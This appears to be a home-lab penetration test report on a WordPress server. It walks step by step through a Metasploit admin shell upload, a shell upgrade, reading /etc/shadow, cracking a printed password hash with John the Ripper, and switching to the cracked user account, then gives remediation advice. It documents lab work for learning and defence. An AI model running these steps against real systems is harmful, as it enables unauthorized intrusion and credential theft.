# üöÄ Vulnerability 02: Remote Code Execution with Privilege Escalation

## üìã Vulnerability Overview

**Vulnerability Type**: Remote Code Execution with Privilege Escalation  
**CVSS Score**: 9.8 (Critical)  
**CWE**: CWE-434: Unrestricted Upload of File with Dangerous Type + CWE-521: Weak Password Requirements  
**OWASP**: A03 Injection + A07 Identification and Authentication Failures  

## üéØ Description

Leveraging the previously discovered administrative credentials, the WordPress installation was exploited using the authenticated file upload vulnerability. Using Metasploit's 'wp_admin_shell_upload' module, a malicious PHP shell was uploaded through the WordPress media functionality, resulting in remote code execution as the www-data user. Post-exploitation enumeration revealed readable /etc/shadow file containing password hashes. The marlinspike user hash was extracted and successfully cracked using John the Ripper's single mode attack, revealing the password "marlinspike". This enabled lateral movement and privilege escalation from www-data to the marlinspike user account, demonstrating complete system compromise.

## üîç Discovery Process

### Prerequisites
- Administrative access to WordPress (from Vulnerability 01)
- WordPress file upload functionality enabled
- Metasploit Framework available

### Attack Chain Overview
1. **Initial Access**: WordPress admin credentials
2. **Code Execution**: Malicious file upload via WordPress
3. **System Access**: Web shell ‚Üí Interactive shell
4. **Information Gathering**: System enumeration
5. **Credential Harvesting**: Password hash extraction
6. **Privilege Escalation**: User account compromise

## üíª Exploitation Methodology

### Phase 1: Metasploit Setup and Configuration

```bash
# 1. Start Metasploit Framework
msfconsole

# 2. Search for WordPress exploits
search wp_admin

# 3. Select the appropriate exploit module
use exploit/unix/webapp/wp_admin_shell_upload

# 4. View configuration options
show options
```

### Phase 2: Exploit Configuration and Execution

```bash
# 5. Configure exploit parameters
set rhosts 10.0.0.13
set password admin
set username admin
set targeturi /secret

# 6. Execute the exploit
run

# Result: Meterpreter session established
```

### Phase 3: Shell Access and Enumeration

```bash
# 7. Access system shell from Meterpreter
shell

# 8. Upgrade to interactive shell
which python
python -c 'import pty;pty.spawn("/bin/bash")'

# 9. Basic system enumeration
cd /tmp
whoami
id
uname -a
```

### Phase 4: Credential Harvesting

```bash
# 10. Extract password hashes
cat /etc/shadow

# 11. Target specific user hash
cat /etc/shadow | grep marlinspike

# Result: marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```

### Phase 5: Password Cracking (New Terminal)

```bash
# 12. Create hash file for cracking
echo 'marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::' > hashed_password.txt

# 13. Crack password using John the Ripper
john --single hashed_password.txt

# Result: Password cracked - "marlinspike"
```

### Phase 6: Privilege Escalation

```bash
# 14. Switch to target user (back to target shell)
su marlinspike
# Password: marlinspike

# 15. Verify privilege escalation
whoami
sudo -l

# Result: Successfully escalated to marlinspike user
```

## üì∏ Evidence Screenshots

### Screenshot 1: Metasploit Module Selection
![image](https://github.com/user-attachments/assets/54b79634-be1d-46b9-bd21-15136c28bde6)


*Figure 1: Metasploit 'wp_admin_shell_upload' exploit module selection*

### Screenshot 2: Exploit Configuration
![image](https://github.com/user-attachments/assets/dc0874d8-122b-44d2-98f1-0a15110dbb6b)


*Figure 2: Configuring exploit parameters for target WordPress installation*

### Screenshot 3: Successful Exploitation
![Successful exploit execution with Meterpreter session established](screenshots/03-successful-exploitation.png)

*Figure 3: Successful exploit execution with Meterpreter session established*

## üé• Video Demonstration

### üì∫ YouTube Demo - Part 1: Remote Code Execution + Privilege Escalation
**Video Title**: "HomeLab_PenTest_2"  
**Duration**: ~6 minutes  
**YouTube Link**: `https://www.youtube.com/watch?v=ImjjAS84D9g&ab_channel=DominicQi`

## üìä Risk Assessment

### Impact Analysis
- **Confidentiality**: Critical - Complete system access and data exposure
- **Integrity**: Critical - Ability to modify system files and data
- **Availability**: Critical - Potential for system disruption or denial of service

### Business Impact
- **Complete System Compromise**: Full control over target system
- **Data Breach**: Access to all user data and system information
- **Lateral Movement**: Potential to access other network resources
- **Persistent Access**: Ability to install backdoors and maintain access
- **Reputation Damage**: Security breach impacts organizational credibility

### Attack Scenarios
1. **Data Exfiltration**: Steal sensitive user and system data
2. **System Backdoors**: Install persistent access mechanisms
3. **Network Pivoting**: Use compromised system to attack other targets
4. **Credential Harvesting**: Extract credentials for other systems
5. **Ransomware Deployment**: Encrypt system files for ransom

## üõ°Ô∏è Remediation Recommendations

### Immediate Actions (Critical - Implement Now)
1. **WordPress Security Updates**
   ```bash
   # Update WordPress to latest version immediately
   # Apply all security patches
   # Update all plugins and themes
   ```

2. **File Upload Restrictions**
   ```php
   // Implement strict file upload validation
   // Restrict file types and execution permissions
   // Move uploads outside web root
   ```

3. **System Hardening**
   ```bash
   # Fix /etc/shadow permissions
   chmod 640 /etc/shadow
   chown root:shadow /etc/shadow
   
   # Remove world-readable permissions
   ```

### Short-term Fixes (Implement Within 24 Hours)
1. **Password Policy Enforcement**
   - Implement strong password complexity requirements
   - Force password changes for all user accounts
   - Implement password history and rotation policies

2. **Web Application Firewall (WAF)**
   - Deploy WAF to filter malicious requests
   - Block file upload attacks
   - Implement IP-based access controls

3. **System Monitoring**
   - Deploy intrusion detection system (IDS)
   - Monitor file system changes
   - Log and alert on privilege escalation attempts

### Long-term Security Measures
1. **Application Security**
   - Implement secure coding practices
   - Regular security code reviews
   - Automated vulnerability scanning

2. **Infrastructure Security**
   - Network segmentation
   - Principle of least privilege
   - Regular penetration testing

3. **Incident Response**
   - Develop incident response procedures
   - Regular security training
   - Backup and recovery testing

## üîß Technical Details

### Metasploit Module Information
- **Module**: exploit/unix/webapp/wp_admin_shell_upload
- **Type**: Remote code execution
- **Platform**: Unix/Linux
- **Privilege Required**: WordPress administrator

### Password Cracking Analysis
- **Hash Type**: SHA-512 crypt ($6$)
- **Cracking Method**: Dictionary attack (single mode)
- **Time to Crack**: < 1 second (weak password)
- **Tool Used**: John the Ripper

### System Information
- **Target OS**: Ubuntu Linux
- **Web Server**: Apache
- **PHP Version**: Vulnerable to file upload
- **File Permissions**: Misconfigured /etc/shadow

## üìö References and Further Reading

- [WordPress Core File Upload Vulnerabilities](https://wordpress.org/support/article/hardening-wordpress/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Linux Privilege Escalation Techniques](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [John the Ripper Documentation](https://www.openwall.com/john/doc/)
---
**üîí Security Impact**: This critical vulnerability chain demonstrates how initial access can be escalated to complete system compromise, highlighting the importance of defense-in-depth security strategies.
